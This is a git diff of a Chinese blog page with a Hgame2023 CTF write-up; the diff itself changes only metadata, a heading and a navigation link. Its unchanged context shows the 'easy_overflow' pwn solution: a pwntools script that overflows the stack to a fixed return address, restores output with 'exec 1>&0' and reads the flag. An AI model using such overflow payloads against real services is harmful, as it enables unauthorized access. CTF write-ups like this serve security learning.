@@ -27,7 +27,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://csc8.github.io/img/wallhaven-0qkglr.jpg">
 <meta property="article:published_time" content="2023-03-03T04:59:34.278Z">
-<meta property="article:modified_time" content="2023-03-05T07:28:04.812Z">
+<meta property="article:modified_time" content="2023-03-14T02:46:59.123Z">
 <meta property="article:author" content="Csc8">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary_large_image">
@@ -319,7 +319,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Hgame"><a href="#Hgame" class="headerlink" title="Hgame"></a>Hgame</h1><h2 id="1-easy-overflow"><a href="#1-easy-overflow" class="headerlink" title="1.easy_overflow"></a>1.easy_overflow</h2><p>在程序<code>close(1)</code>的前提下</p>
+                <h1 id="Hgame2023"><a href="#Hgame2023" class="headerlink" title="Hgame2023"></a>Hgame2023</h1><h2 id="1-easy-overflow"><a href="#1-easy-overflow" class="headerlink" title="1.easy_overflow"></a>1.easy_overflow</h2><p>在程序<code>close(1)</code>的前提下</p>
 <p>获取到了shell，执行<code>exec 1&gt;&amp;0</code>命令重启命令行，便可输出内容</p>
 <p>（或者<code>exec &lt; flag</code>，将flag打印到当前终端）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span><br>port = <span class="hljs-number">32054</span><br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x401176</span>)<br>sl(payload)<br>     <br>sl(<span class="hljs-string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>pi()<br></code></pre></td></tr></table></figure>
@@ -1045,6 +1045,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/03/18/Pwnhub-%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="Pwnhub三月赛+铁三heap2019">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Pwnhub三月赛+铁三heap2019</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
